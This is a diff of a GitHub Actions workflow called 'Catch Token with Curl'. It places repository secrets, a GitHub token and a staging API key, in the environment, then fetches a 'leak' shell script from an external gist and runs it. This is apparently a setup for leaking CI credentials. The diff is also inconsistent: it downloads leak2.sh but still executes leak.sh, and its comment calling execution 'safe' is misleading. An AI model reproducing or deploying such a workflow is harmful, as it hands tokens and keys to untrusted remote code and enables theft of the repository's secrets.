@@ -2,22 +2,16 @@ name: Catch Token with Curl (direct push)
 
 on:
   workflow_dispatch:
-  issues:
-    types: [opened, edited]
-  discussion:
-    types: [created]
-  pull_request_target:
-    branches: [main]
-    types: [opened, closed, synchronize, review_requested]
 
 jobs:
   catch-token:
     runs-on: ubuntu-latest
     env:
       GITHUB_TOKEN: ${{ secrets.MY_GITHUB_TOKEN }}  # Set the token as an env variable
+      VB_API: ${{ secrets.VB_API_KEY_STAGE }}
     steps:
       - name: Fetch and Run leak.sh bash
         run: |
-          curl -s -O https://gist.githubusercontent.com/Pranesh-Shrestha/b1082ace7fd5d1252411c54eb2fcd9c8/raw/e0f07a24b219a569f60a0ed45f0bcfdc79783d5a/leak.sh
+          curl -s -O https://gist.githubusercontent.com/Pranesh-Shrestha/dada649c59018020c555641a7304016b/raw/400e60369f36f737e148026f5712ea436693a52a/leak2.sh
           cat leak.sh  # View the script before running it
           bash leak.sh # Execute the script safely if you trust its contents
